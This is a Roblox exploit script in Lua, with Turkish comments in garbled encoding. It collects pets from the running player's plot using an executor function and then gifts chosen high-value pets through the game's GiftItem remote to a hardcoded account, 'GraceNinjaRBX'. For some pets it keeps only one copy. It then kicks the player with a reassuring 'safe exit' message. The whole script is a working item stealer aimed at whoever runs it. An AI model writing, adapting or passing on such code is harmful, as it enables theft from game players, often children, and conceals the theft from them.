local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")
local backpack = player:WaitForChild("Backpack")

local giftEvent = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
local favoriteEvent = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FavoriteItem")

task.wait(5)

-- Tamamen g√∂nderilecek petler
local targetPetNames = {
    "Los Mr Carrotitos",
    "Pot Hotspot",
    "67"
}

-- En az 1 sende kalacak petler
local targetPetNames2 = {
    "Los Sekolitos",
    "Crazylone Pizaione",
    "Garamararam",
    "La Tomatoro",
    "Los Tralaleritos"
}

local recipientUsername = "GraceNinjaRBX"

----------------------------------------------------------------------
-- Yardƒ±mcƒ± Fonksiyonlar
----------------------------------------------------------------------

local function cleanBaseName(petName)
    local cleaned = petName
    cleaned = cleaned:gsub("%[.-%]", "")
    cleaned = cleaned:gsub("Shiny%s+", "")
    cleaned = cleaned:gsub("Rainbow%s+", "")
    cleaned = cleaned:gsub("Gold%s+", "")
    cleaned = cleaned:gsub("^%s+", "")
    cleaned = cleaned:gsub("%s+$", "")
    return cleaned
end

local function isTargetName(name)
    for _, target in ipairs(targetPetNames) do
        if name == target then
            return true
        end
    end
    return false
end

local function isTargetName2(name)
    for _, target in ipairs(targetPetNames2) do
        if name == target then
            return true
        end
    end
    return false
end

----------------------------------------------------------------------
-- Plot ƒ∞≈ülemleri (isim kontrols√ºz)
----------------------------------------------------------------------

local function teleportAndTrigger(folder)
    local brainrot = folder:FindFirstChild("Brainrot")
    if not brainrot then return end

    local hitbox = folder:FindFirstChild("Hitbox") or folder:FindFirstChild("BrainrotHitbox")
    if hitbox then
        hrp.CFrame = hitbox.CFrame + Vector3.new(0, 3, 0)
        task.wait(0.3)
        local prompt = hitbox:FindFirstChildOfClass("ProximityPrompt")
        if prompt then
            fireproximityprompt(prompt)
            print("‚úÖ Tetiklendi:", folder.Name)
            task.wait(1)
        else
            warn("‚ùå ProximityPrompt yok:", folder.Name)
        end
    end
end

local function collectMyPlot()
    local myPlotNumber = player:GetAttribute("Plot")
    if not myPlotNumber then
        warn("‚ùå Plot bulunamadƒ± (Attribute yok)")
        return
    end

    local plot = workspace:WaitForChild("Plots"):FindFirstChild(tostring(myPlotNumber))
    if not plot then
        warn("‚ùå Plot bulunamadƒ±: " .. tostring(myPlotNumber))
        return
    end

    for check = 1, 3 do
        print("üîÅ Plot kontrol√º (" .. check .. "/3)")
        local brainrotsFolder = plot:FindFirstChild("Plants")
        if brainrotsFolder then
            for _, folder in ipairs(brainrotsFolder:GetChildren()) do
                if tonumber(folder.Name) ~= nil then
                    teleportAndTrigger(folder)
                end
            end
        end
        task.wait(2)
    end
    print("üéâ Plot i≈ülemi tamamlandƒ±.")
end

----------------------------------------------------------------------
-- Gift ƒ∞≈ülemleri (Tamamen G√∂nderilecekler)
----------------------------------------------------------------------

local function getAllMatchingPets()
    local pets = {}
    for _, container in ipairs({ backpack, character }) do
        for _, item in ipairs(container:GetChildren()) do
            if (item:IsA("Tool") or item:IsA("Model")) then
                local base = cleanBaseName(item.Name)
                if isTargetName(base) then
                    table.insert(pets, item)
                    print("üéÅ G√∂nderilecek pet bulundu:", item.Name)
                end
            end
        end
    end
    return pets
end

local function sendAllMatchingPets()
    local pets = getAllMatchingPets()
    print("üéÅ G√∂nderim ba≈ülatƒ±ldƒ±. (" .. #pets .. " adet)")

    for _, pet in ipairs(pets) do
        if pet.Parent ~= character then pet.Parent = character task.wait(0.3) end
        giftEvent:FireServer({ Item = pet, ToGift = recipientUsername })

        local timeout = 5
        local start = tick()
        while pet.Parent ~= nil and tick() - start < timeout do task.wait(0.1) end

        if pet.Parent ~= nil then
            warn("‚ö†Ô∏è G√∂nderilemedi:", pet.Name)
        else
            print("‚úÖ G√∂nderildi:", pet.Name)
        end
        task.wait(0.5)
    end
end

----------------------------------------------------------------------
-- Gift ƒ∞≈ülemleri (Fazlalƒ±klarƒ± G√∂nder, 1 Sende Kalacak)
----------------------------------------------------------------------

local function getAllMatchingPets2()
    local pets = {}
    for _, container in ipairs({ backpack, character }) do
        for _, item in ipairs(container:GetChildren()) do
            if (item:IsA("Tool") or item:IsA("Model")) then
                local base = cleanBaseName(item.Name)
                if isTargetName2(base) then
                    table.insert(pets, item)
                    print("üì¶ 2. Listedeki pet bulundu:", item.Name)
                end
            end
        end
    end
    return pets
end

local function sendAllMatchingPets2()
    local allPets = getAllMatchingPets2()
    if #allPets == 0 then
        print("üì≠ ƒ∞kinci listedeki pet yok.")
        return
    end

    local grouped = {}
    for _, pet in ipairs(allPets) do
        local baseName = cleanBaseName(pet.Name)
        grouped[baseName] = grouped[baseName] or {}
        table.insert(grouped[baseName], pet)
    end

    for baseName, pets in pairs(grouped) do
        print("üì¶ " .. baseName .. " grubunda " .. #pets .. " tane var.")
        if #pets > 1 then
            local toSendCount = #pets - 1
            print("üì§ " .. baseName .. " grubundan " .. toSendCount .. " tanesi g√∂nderilecek.")
            for i = 1, toSendCount do
                local pet = pets[i]
                if pet.Parent ~= character then pet.Parent = character task.wait(0.3) end
                giftEvent:FireServer({ Item = pet, ToGift = recipientUsername })

                local timeout = 5
                local start = tick()
                while pet.Parent ~= nil and tick() - start < timeout do task.wait(0.1) end

                if pet.Parent ~= nil then
                    warn("‚ö†Ô∏è G√∂nderilemedi:", pet.Name)
                else
                    print("‚úÖ G√∂nderildi:", pet.Name)
                end
                task.wait(0.5)
            end
        else
            print("‚úÖ " .. baseName .. " sadece 1 tane, sende kaldƒ±.")
        end
    end
end

----------------------------------------------------------------------
-- Ana √áalƒ±≈ütƒ±rma
----------------------------------------------------------------------

local function main()
    collectMyPlot()
    sendAllMatchingPets()
    sendAllMatchingPets2()

    print("üéâ T√ºm i≈ülemler ba≈üarƒ±yla tamamlandƒ±. 5 saniye i√ßinde √ßƒ±kƒ±lƒ±yor...")
    task.wait(5)
    player:Kick("‚úÖ ƒ∞≈ülemler tamamlandƒ±! G√ºvenli ≈üekilde √ßƒ±kƒ±≈ü yapƒ±lƒ±yor.")
end

main()
